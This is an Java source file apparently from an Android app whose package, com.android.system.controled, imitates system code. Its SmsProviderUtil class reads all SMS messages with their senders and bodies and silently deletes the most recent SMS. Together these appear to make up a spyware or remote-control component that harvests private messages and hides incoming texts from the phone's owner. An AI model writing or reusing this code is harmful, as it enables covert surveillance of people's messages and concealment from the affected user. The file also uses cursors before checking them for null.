package com.android.system.controled.util;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.SmsInfo;

public class SmsProviderUtil {

	private static SmsProviderUtil mInstence;

	private SmsProviderUtil() {

	}

	public static SmsProviderUtil getInstence() {
		if (mInstence == null) {
			mInstence = new SmsProviderUtil();
		}

		return mInstence;
	}

	/**
	 * 获得短信信息
	 * 
	 * @Description:
	 * @param folder
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-10-26
	 */
	public ArrayList<SmsInfo> getAllSmsInfo(String folder) {
		ArrayList<SmsInfo> infos = new ArrayList<SmsInfo>();
		Cursor cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(folder), SmsUtil.SMS_COLUMNS, null, null, null);

		int threadidColumn = cusor.getColumnIndex("thread_id");
		int dateColumn = cusor.getColumnIndex("date");
		int addressColumn = cusor.getColumnIndex("address");
		int personColumn = cusor.getColumnIndex("person");
		int typeColumn = cusor.getColumnIndex("type");
		int subjectColumn = cusor.getColumnIndex("subject");
		int bodyColumn = cusor.getColumnIndex("body");
		int readColumn = cusor.getColumnIndex("read");
		int statusColumn = cusor.getColumnIndex("status");

		if (cusor != null) {
			cusor.moveToLast();
			do {
				SmsInfo smsinfo = new SmsInfo();
				smsinfo.setThread_id(cusor.getInt(threadidColumn));
				smsinfo.setDate(cusor.getLong(dateColumn));
				smsinfo.setAddress(cusor.getString(addressColumn));
				smsinfo.setPerson(cusor.getInt(personColumn));
				smsinfo.setType(cusor.getInt(typeColumn));
				smsinfo.setSubject(cusor.getString(subjectColumn));
				smsinfo.setBody(cusor.getString(bodyColumn));
				smsinfo.setRead(cusor.getInt(readColumn));
				smsinfo.setStatus(cusor.getInt(statusColumn));
				infos.add(smsinfo);
			} while (cusor.moveToPrevious());
			cusor.close();
		}
		return infos;
	}

	/**
	 * 获得最后一条信息的信息
	 * 
	 * @Description:
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-10-26
	 */
	public SmsInfo getLastSmsInfo() {
		SmsInfo smsinfo = new SmsInfo();
		Cursor cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), SmsUtil.SMS_COLUMNS, null, null, null);

		int threadidColumn = cusor.getColumnIndex("thread_id");
		int dateColumn = cusor.getColumnIndex("date");
		int addressColumn = cusor.getColumnIndex("address");
		int personColumn = cusor.getColumnIndex("person");
		int typeColumn = cusor.getColumnIndex("type");
		int subjectColumn = cusor.getColumnIndex("subject");
		int bodyColumn = cusor.getColumnIndex("body");
		int readColumn = cusor.getColumnIndex("read");
		int statusColumn = cusor.getColumnIndex("status");

		if (cusor != null) {
			cusor.moveToFirst();
			smsinfo.setThread_id(cusor.getInt(threadidColumn));
			smsinfo.setDate(cusor.getLong(dateColumn));
			smsinfo.setAddress(cusor.getString(addressColumn));
			smsinfo.setPerson(cusor.getInt(personColumn));
			smsinfo.setType(cusor.getInt(typeColumn));
			smsinfo.setSubject(cusor.getString(subjectColumn));
			smsinfo.setBody(cusor.getString(bodyColumn));
			smsinfo.setRead(cusor.getInt(readColumn));
			smsinfo.setStatus(cusor.getInt(statusColumn));
			cusor.close();
		}

		return smsinfo;
	}

	/**
	 * 删除最后一条短信
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public void deleteLastSms() {
		// 获得最后一条短信的id，然后删除
		Debug.e("", "Try do delete last msg");
		String[] a = new String[] { "_id" };
		Cursor cusor = null;
		try {
			cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), a, null, null, null);
			if (cusor != null) {
				cusor.moveToFirst();
				Debug.e("SmsProviderUtil", "delete id:" + cusor.getLong(0) + "All: " + cusor.getCount());
				MainApplication.getInstence().getContentResolver().delete(Uri.parse(SmsUtil.SMS_URI_ALL), "_id='" + cusor.getLong(0) + "'", null);
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cusor != null) {
				cusor.close();
			}
		}

	}

}